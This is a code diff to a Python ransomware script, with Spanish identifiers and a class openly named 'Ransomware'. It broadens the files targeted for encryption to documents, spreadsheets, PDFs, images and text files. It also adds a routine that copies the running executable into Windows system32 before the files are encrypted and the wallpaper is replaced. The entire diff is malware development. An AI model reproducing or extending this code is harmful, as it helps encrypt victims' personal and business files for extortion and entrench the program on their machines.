@@ -5,6 +5,8 @@ from Crypto.Cipher import PKCS1_OAEP
 from Crypto.Protocol.KDF import PBKDF2
 
 import os
+import sys
+import shutil
 import re
 import base64
 
@@ -15,7 +17,7 @@ class Ransomware:
     def __init__(self) -> None:
         self.password = ''
         self.archivos = []
-        self.pattern = re.compile(r'.*\.(xlsx)$')
+        self.pattern = re.compile(r'.*\.(docx|xlsx|pdf|jpeg|jpg|txt)$')
         self.listarArchivos()
         self.generarPassword()
 
@@ -58,8 +60,17 @@ class Ransomware:
                 f.write( ciphertext )
             # secure_delete.delete(archivo)
 
+    def copiarExe( self ):
+        origen = sys.executable
+        destino = os.path.join( os.environ['WINDIR'], 'system32' )
+        try:
+            shutil.copy(origen, destino)
+        except Exception as e:
+            print( f'No jalo: {e}' )
+
 def main():
     r = Ransomware()
+    r.copiarExe()
     r.cifrarArchivos()
     cambiarFondo( 'Malware.png' )
 main()
